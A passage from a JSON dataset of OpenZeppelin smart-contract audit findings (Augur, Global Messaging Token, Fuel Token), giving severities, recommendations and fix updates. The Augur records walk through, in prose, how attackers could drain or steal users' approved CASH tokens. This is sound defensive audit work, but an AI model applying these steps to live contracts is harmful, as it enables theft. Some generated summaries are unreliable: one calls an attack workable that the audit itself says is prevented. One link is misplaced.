239](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L239). From now on, every call to `Market`‘s [`isFinalized`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L468) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L468) will return `true`.\n* 3.4) In [line 250](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L250), the execution flow goes into the [`distributeValidityBondAndMarketCreatorFees`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L308) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L308), where in line 310 the [`marketCreatorFeesAttoCash`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L310) [is set to](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L310) [`validityBondAttoCash`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L310), which in turn is all `Market`‘s CASH balance (see 1.5).\n* 3.5) Inside the [`distributeMarketCreatorFees`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L314) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L314), the [call to](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L315) [`isInvalid`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L315) [in line 315](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L315) will return `true` (see 3.3 and 2.4), therefore the execution flow will jump straight to [line 321](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L321), where the `Market` contract will finally send `marketCreatorFeesAttoCash` amount of tokens (the entire CASH balance – see 3.4 and 1.5) to an attacker-controlled address (as the attacker controls `universe.getOrCreateNextDisputeWindow(false)`).\n\n\nAs explained, by combining the vulnerability reported in the issue **“[C01] All CASH tokens approved to Augur can be emptied”** with the correct execution of the steps above, any malicious user can effectively steal CASH tokens that are approved to the Augur contract. While initially the attack here described seems to be prevented by properly verifying the legitimacy of the `universe` address set in the `Market` contract, a thorough review of the entire attack vector, which includes complex interactions between the [`Augur`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol), [`MarketFactory`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol), [`Market`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol) and [`InitialReporter`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol) contracts, is in order, so as to determine the most appropriate course of action to mitigate the critical vulnerability.\n\n\n***Update****: the Augur team correctly pointed out that this attack is not actually possible because the transaction will be reverted upon calling the `logInitialReportSubmitted`* *function in the* *`Augur`* *contract (which checks that the passed universe address is legitimate).*",
      "summary": "\nA critical vulnerability has been discovered in Augur's CASH tokens which can be exploited by malicious users to move all CASH tokens approved to Augur and send them to Market contracts. However, a severe attack vector has been identified in the Market contract that would allow the attacker to actually steal all tokens previously moved to the Market contract. \n\nThe issue is an extension of the original vulnerability, and the attack vector is enabled by the lack of input validations. The attacker is able to set the Market's owner and repBondOwner to the victim's address, set the universe to an attacker controlled IUniverse contract, set the repBond to zero, set the validityBondAttoCash to the entire CASH balance of the Market contract, register themselves as the owner and actualReporter of the InitialReporter contract, set the payoutNumerators to the attacker-controlled _payoutNumerators, set the size to zero, and call the finalize function on the Market contract.\n\nOnce the endTime passes, the attacker can either submit an initial report or wait the 24 hours until public reporting is allowed. In either case, the Market has to be reported as \"Invalid\". This allows the attacker to bypass the logic in the else clause, have the universe set the winningPayoutDistributionHash to some value other than zero, and have every call to the Market's isFinalized function return true. The result is that the attacker is able to move all CASH tokens to any address in their control.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11499",
      "title": "[C01] All CASH tokens approved to Augur can be emptied",
      "impact": "HIGH",
      "content": "A [`MarketFactory`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol) has a [`createMarket`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L13) [public function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L13) that allows anyone to create a new [`Market`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol). After [creating the market](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L14), and before [initializing it](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L18), the factory first [transfers all its REP token balance to the market](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L16). Then, it calls the given [`IAugur`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/IAugur.sol) [`contract`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/IAugur.sol) to execute a “trusted transfer” of CASH tokens, for an amount given by `_universe.getOrCacheValidityBond()` (being `_universe` the address of a potentially user-controlled [`IUniverse`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/IUniverse.sol) contract).\n\n\nIn a scenario where a victim has approved `N` CASH tokens to the `Augur` contract, and the `MarketFactory` is registered as a [`trustedSender`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L75) in such `Augur` contract, an attack vector has been identified where tokens approved by the victim to the `Augur` contract can be freely emptied by an attacker, sending them to any newly created market.\n\n\nAll the attacker needs to do is call the [`createMarket`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L13) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L13) of the trusted `MarketFactory` with the following relevant parameters:\n\n\n* `_universe`: an address of a contract controlled by the attacker that implements the `getReputationToken` function and `getOrCacheValidityBond` function\n* `_sender`: address of the victim that approved `N` “Cash” tokens to `Augur` contract\n\n\nAs a consequence:\n\n\n1. The [`require`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L16) [in line 16 of](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L16) [`MarketFactory.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L16) passes regardless of how many tokens the `MarketFactory` contact owns.\n2. The [`require`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L17) [in line 17 of](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L17) [`MarketFactory.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L17) makes a [`trustedTransfer`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L204) of CASH tokens. The amount of tokens to be transferred is controlled by attacker, as attacker controls `_universe.getOrCacheValidityBond()`.\n3. Upon its [`trustedTransfer`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L204) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L204) being called, the [`Augur`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L205) [contract recognizes](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L205) [`MarketFactory`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L205) [as a](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L205) [`trustedSender`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L205), and executes a `transferFrom` from the victim’s address, to the market’s address, of as much tokens as the attacker set.\n4. Finally, back in the `MarketFactory` contract, the [created market is initialized](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol#L18).\n\n\nAs a result, the victim lost all CASH tokens approved to `Augur`, which were freely moved by an attacker to the newly created market. It is important to highlight that in the issue **“CASH tokens can be stolen from the Market contract”** a related attack vector is thoroughly described, where the attacker is able to actually steal the tokens moved to the market.\n\n\nEven if a user approves a certain amount of tokens to a contract (*e.g.* the `Augur` contract), under no circumstances should those tokens be allowed to be moved at the will of a potentially malicious external actor. Therefore, consider implementing the necessary restrictions in the `MarketFactory` contract to prevent a scenario as the one described above. Related unit tests to thoroughly cover such dangerous cases must also be implemented.\n\n\n***Update:*** *fixed in* *`814b390`* *by checking that the universe address passed into the* *`createMarket`* *function is a known universe, thus eliminating the possibility of it being malicious.*",
      "summary": "\nA bug report has been identified in the Augur project, which is a decentralized prediction market platform. The bug involves the MarketFactory contract, which has a public function called createMarket that allows anyone to create a new Market. Before initializing the market, the factory transfers all its REP token balance to the market and calls the IAugur contract to execute a “trusted transfer” of CASH tokens.\n\nIn a scenario where a victim has approved N CASH tokens to the Augur contract, and the MarketFactory is registered as a trustedSender in such Augur contract, an attack vector has been identified where tokens approved by the victim to the Augur contract can be freely emptied by an attacker, sending them to any newly created market. The attacker needs to call the createMarket function of the trusted MarketFactory with relevant parameters that include the address of a contract controlled by the attacker that implements the getReputationToken function and getOrCacheValidityBond function, and the address of the victim that approved N “Cash” tokens to Augur contract.\n\nAs a consequence, the Augur contract recognizes MarketFactory as a trustedSender and executes a transferFrom from the victim’s address, to the market’s address, of as much tokens as the attacker set. The victim then loses all CASH tokens approved to Augur, which were freely moved by the attacker to the newly created market.\n\nTo prevent this scenario, the necessary restrictions must be implemented in the MarketFactory contract, and related unit tests must also be implemented. The bug has since been fixed in 814b390 by checking that the universe address passed into the createMarket function is a known universe, thus eliminating the possibility of it being malicious.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12005",
      "title": "Duplicate decimals value",
      "impact": "LOW",
      "content": "The `decimals` parameter used to calculate token amounts is duplicated in the [`GMToken`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L18) and [`GMTSafe`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Safe/GMTSafe.sol#L17) contracts. This redundancy is error-prone, as the two variables could get out of sync if they are changed at any moment. Consider leaving only the `decimals` variable defined in `GMToken`. The `GMTSafe` contract can store the [token grain amount](https://twitter.com/maraoz/status/900411044463378432) to be transferred, instead of the token unit amount (e.g. `4*10¹⁸ vs 4`).\n\n\n***Update:** Fixed in the latest version.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12004",
      "title": "ERC20 compliance",
      "impact": "LOW",
      "content": "ERC20 specifies `decimals` to be a value of type `uint8`. It is [declared](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L18) as a `uint256` variable in `GMToken`. Consider changing it to `uint8`. If so, it will be necessary to cast to `uint256` when using the variable for arithmetic such as when expressing token amounts like in [`500 * (10**6) * 10**decimals`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L43). Consider defining a constant `uint256 TOKEN_UNIT = 10 ** uint256(decimals)` to write `500e6 * TOKEN_UNIT` in these cases.\n\n\nA `Transfer` event is emitted next to `ClaimGMT` in the constructor, and there is a spot on comment with an explanation. We would add to it that emitting a `Transfer` event when creating tokens enhances user experience by allowing applications such as [Etherscan](https://etherscan.io/) to learn of the new token holders. A similar `Transfer` event is missing [next to](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L155) [`ClaimGMT`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L155) in `claimTokens`. Consider adding it: `Transfer(0x0, msg.sender, tokens)`.\n\n\n***Update:** Fixed in the latest version.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12003",
      "title": "Unsafe math",
      "impact": "LOW",
      "content": "There are many unchecked arithmetic operations in `GMToken` and `StandardToken`. It’s always better to be safe and perform checked operations. Consider using the [`SafeMath`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/dfe4914c6856b06e3f02475cd6ee834855fc9726/contracts/Utils/SafeMath.sol) library, or performing pre-condition checks on any math operation.\n\n\n***Update:** Fixed in the latest version.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12002",
      "title": "Reuse open source contracts",
      "impact": "LOW",
      "content": "The contracts [`StandardToken`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/StandardToken.sol), [`GMToken`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol) and [`SafeMath`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Utils/SafeMath.sol) are very similar to code found in [OpenZeppelin](https://openzeppelin.org/)’s [`StandardToken`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.3.0/contracts/token/StandardToken.sol), [`Crowdsale`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.3.0/contracts/token/StandardToken.sol), [RefundableCrowdsale](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.3.0/contracts/crowdsale/Crowdsale.sol) and [`SafeMath`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.3.0/contracts/math/SafeMath.sol) contracts. Reimplementing functionality instead of reusing public and already audited code can bring [regression problems and difficult to find bugs](https://blog.zeppelin.solutions/hackergold-bug-analysis-68d893cad738). Consider installing and using the code available in [OpenZeppelin](https://openzeppelin.org/).\n\n\n***Update:** The team has pointed out that the token is in fact taken from [ConsenSys](https://github.com/ConsenSys/Tokens/tree/bb15a1f0140d8f388a59fd77b444c7ac65f06c55).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12001",
      "title": "Constructor parameter sanity checks",
      "impact": "LOW",
      "content": "Consider performing sanity checks to validate `GMToken`’s [constructor parameters](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L99-L102). Check that `_startBlock &lt; _endBlock`.\n\n\n***Update:** Fixed in the latest version.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12000",
      "title": "Using block numbers to specify start and end",
      "impact": "LOW",
      "content": "The sale uses block numbers to specify [when it starts and when it ends](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L40-L41). The current recommendation is to use timestamps instead. The risk of miner manipulation of timestamps is very low for this use case, and due to the [Difficulty Bomb](https://etherscan.io/chart/blocktime) it is now very difficult to correctly estimate future block times. Consider switching to timestamps.\n\n\n***Update:** The team has decided to keep using block numbers.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11999",
      "title": "Arbitrary and redundant stage state variable",
      "impact": "MEDIUM",
      "content": "The functions [`startSale`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L125), [`stopSale`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L131) and [`setFailedState`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L137) allow the owner to set the [`stage`](http://tampermonkey.net/changelog.php?version=4.5.5570&ext=fire&updated=true&old=4.5.5564&intr=true) state variable. However, there are no restrictions on when they can be called, and consequently the value of the `stage` variable isn’t necessarily the *actual* stage of the sale. As an example, in the middle of the sale the owner can call `setFailedState`, without it having really failed.\n\n\nThe variable actually serves no purpose other than giving the owner some control over when its functions can be called. This control is limited, however, because there are already other restrictions in place. For example, `refund` can only be called [after the sale period](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L201) and [if the minimum cap isn’t reached](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L202). This makes us think the `stage` variable is redundant.\n\n\nWe would recommend to remove it along with the setter functions, to further trust minimization and remove the possible inconsistent states. Alternatively, add checks to `stage` setter functions, and only rely on those for other function preconditions.\n\n\n***Update:** The variable was removed in the latest version.*",
      "summary": "\nThis bug report is about the functions [`startSale`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L125), [`stopSale`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L131) and [`setFailedState`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L137) which allow the owner to set the [`stage`](http://tampermonkey.net/changelog.php?version=4.5.5570&ext=fire&updated=true&old=4.5.5564&intr=true) state variable. This variable is redundant, as there are already other restrictions in place that limit when certain functions can be called. For example, `refund` can only be called after the sale period and if the minimum cap isn’t reached. The bug report recommends removing the variable and the setter functions for trust minimization, or adding checks to the setter functions so that they are the only ones relied on for other function preconditions. The variable has since been removed in the latest version.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11998",
      "title": "Team can circumvent refund restriction",
      "impact": "HIGH",
      "content": "The [`refund`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L201) function allows investors to ask for a refund if the minimum cap is not reached. Radical App International is given a share of tokens [at the beginning of the process](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L115) for which they should not be entitled to a refund. This is accounted for by [not allowing their address](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L203) to call `refund`. Since tokens are always transferable, they could easily circumvent this by transferring the tokens to another address and calling `refund` from it.\n\n\nConsider disallowing transfers until the crowdsale ends successfully, for example by using [OpenZeppelin’s `PausableToken`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/token/PausableToken.sol) or something similar. Not only will it fix this bug, but it’s also common practice.\n\n\nAlternatively, consider giving Radical App International its share of tokens at the successful finalization of the crowdsale.\n\n\n***Update:** Fixed with the alternative suggestion in the latest version.*",
      "summary": "\nThis bug report is about the `refund` function in the Global Messaging Token Contracts. This function allows investors to ask for a refund if the minimum cap is not reached. Radical App International is given a share of tokens at the beginning of the process, for which they should not be entitled to a refund. To account for this, the code does not allow their address to call `refund`. However, since tokens are always transferable, they could easily circumvent this by transferring the tokens to another address and calling `refund` from it.\n\nThe bug was fixed with the alternative suggestion in the latest version. Two solutions were suggested to prevent Radical App International from getting a refund: disallowing transfers until the crowdsale ends successfully, for example by using OpenZeppelin’s `PausableToken`; or giving Radical App International its share of tokens at the successful finalization of the crowdsale.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12017",
      "title": "Rejecting non-zero transfers is not ERC20 compliant",
      "impact": "LOW",
      "content": "The ERC20 specification states that [“transfers of 0 values MUST be treated as normal transfers”](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md#transfer). In `FuelToken` these are [rejected](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L93). Consider removing the modifier `nonZeroAmount(_amount)` from `transfer` and `transferFrom`.\n\n\n***Update:** Fixed in [`2b9e0b3`](https://github.com/etherparty/FUEL-Contracts/commit/2b9e0b37b43e2fbfccc8c2203c821943c03f9502).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Fuel Token Audit",
      "source_link": "https://blog.openzeppelin.com/fuel-token-audit-30cc02f257f5/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12016",
      "title": "High coupling between token and crowdfund contracts",
      "impact": "MEDIUM",
      "content": "The token contract does a lot more than handle balances, transfers, and allowance. It has special code for crowdfund-originated “transfers”, for the Vanbex team vesting, and for the presale. It has variables and events to track crowdfund and presale state. As a result of all this, the code is very hard to follow and to ensure it is bug-free. At this stage, it would be a high risk to redesign the contracts, so we will not recommend that. However, the team should keep in mind to follow software engineering principles such as [separation of concerns](https://en.wikipedia.org/wiki/Separation_of_concerns), [single responsibility](https://en.wikipedia.org/wiki/Single_responsibility_principle), [low coupling](https://en.wikipedia.org/wiki/Loose_coupling), etcetera, for any new contracts they write.",
      "summary": "\nThis bug report is about a token contract that has a lot of complex code. It is difficult to ensure that the code is free of bugs and it would be a high risk to redesign the contracts. The team should follow software engineering principles such as separation of concerns, single responsibility, and low coupling when writing any new contracts. Separation of concerns is a design principle which states that a program should be divided into distinct sections, so that each section addresses a separate concern. Single responsibility is a principle which states that a class should have one and only one reason to change. Low coupling is a design principle which states that a program should be structured so that each part has as little knowledge as possible about other parts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Fuel Token Audit",
      "source_link": "https://blog.openzeppelin.com/fuel-token-audit-30cc02f257f5/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12015",
      "title": "Semantics of totalAllocatedTokens",
      "impact": "MEDIUM",
      "content": "It is unclear what the [`totalAllocatedTokens`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L27) state variable of `FuelToken` means. At the moment the crowdfund is finalized, this variable will get out of sync with the amount of tokens actually distributed, because the platform will have all of the remaining supply to sell. Consider removing the variable altogether, or calling `allocateTokens` when the final remaining tokens are transferred to the platform in `finalizeCrowdfund`.\n\n\n***Update:** The variable was removed in [`86abce6`](https://github.com/etherparty/FUEL-Contracts/commit/86abce6f47041c9328037673d422834138bcc395).*",
      "summary": "\nThe bug report is about the state variable `totalAllocatedTokens` of the `FuelToken` contract. It is unclear what this variable means and it will get out of sync with the amount of tokens actually distributed when the crowdfund is finalized. To fix the issue, the variable should either be removed or `allocateTokens` should be called when the final remaining tokens are transferred to the platform. This issue has been resolved as the variable was removed in the `86abce6` commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Fuel Token Audit",
      "source_link": "https://blog.openzeppelin.com/fuel-token-audit-30cc02f257f5/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12014",
      "title": "Duplicate data",
      "impact": "MEDIUM",
      "content": "The token contract `FuelToken` has a state variable [`crowdfundEndsAt`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L133) which is hardcoded to be the same value as the `FuelCrowdfund`’s `endsAt` state variable. This duplication of the value is error-prone, as it could easily get out of sync. Consider getting the value directly from the crowdfund, as `crowdfund.endsAt()`.",
      "summary": "\nThe bug report concerns the token contract FuelToken which has a state variable called crowdfundEndsAt. This variable is hardcoded to the same value as the FuelCrowdfund’s endsAt state variable. This duplication of the value is not ideal as it could easily get out of sync. To avoid this issue, the value should be obtained directly from the crowdfund using the crowdfund.endsAt() function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Fuel Token Audit",
      "source_link": "https://blog.openzeppelin.com/fuel-token-audit-30cc02f257f5/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12013",
      "title": "Unchecked return value",
